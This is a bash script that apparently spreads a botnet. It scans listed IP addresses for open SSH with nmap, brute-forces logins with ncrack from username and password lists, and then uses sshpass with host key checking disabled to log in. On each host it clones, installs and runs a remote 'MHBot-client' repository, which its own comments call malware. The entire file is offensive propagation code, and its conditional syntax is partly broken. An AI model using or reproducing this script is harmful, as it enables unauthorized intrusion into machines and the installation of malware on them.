#!/bin/bash

#If nmap is not installed then install it.
if [ $(dpkg-query -W -f='${Status}' nmap 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
  apt-get install nmap;
fi

#Scan the network for open ssh ports with given ip address then create an output.
sudo nmap -iL ipaddress.txt -oX output -p 22



#If ncrack is not installed then install it.
if [ $(dpkg-query -W -f='${Status}' ncrack 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
  apt-get install ncrack;
fi

#Try to find username and password of the device which port of the ssh is opened with existing username and pass lists.
resultNcrack=$(ncrack -iX output -U usernamelist.txt -P passwordlist.txt -p 22 | grep 'ssh:')


#Parse the ip address, username and password of the vulnerable device from the ncrack output.
ipAddress=$(echo $resultNcrack | grep 'ssh' | awk  {'print $1'})
username=$(echo $resultNcrack | grep 'ssh' | cut -d "'" -f 2)
password=$(echo $resultNcrack | grep 'ssh' | cut -d "'" -f 4)

#Getting OS. 0=Linux(ubuntu) 1=Raspberrypi 2=Windows
if [ $(cat output | grep $ipAddress -A 10 | grep osclass | cut -d '"' -f 4) = 'Linux']
then
  if [ $(cat output | grep $ipAddress -A 10 | grep Raspberry | cut -d '"' -f 6 | awk {'print $1'}) = 'Raspberry']
  then
    os=1
  else
    os=0
  fi
else
  os=2
fi

#If sshpass package is not installed then install it.
  if [ $(dpkg-query -W -f='${Status}' sshpass 2>/dev/null | grep -c "ok installed") -eq 0 ];
  then
    apt-get install sshpass;
  fi
  #If git package is not installed then install it.
  if [ $(dpkg-query -W -f='${Status}' git 2>/dev/null | grep -c "ok installed") -eq 0 ];
  then
    apt-get install git;
  fi

#Try to connect to vulnerable device through shh and it's operating system.
if [ os -eq 0]
  #Try to connect to vulnerable device through ssh and install the malware and execute it.
  sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"

elif [ os -eq 1]
then
#Try to connect to vulnerable device through ssh and install the malware and execute it.
sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"
else
#Try to connect to vulnerable device through ssh and install the malware and execute it.
sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"
then







#Try to connect to vulnerable device through ssh and install the malware and execute it.
sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ipAddress "git clone https://github.com/HakanKurtt/MHBot-client; cd MHBot-client;npm install;node client.js"
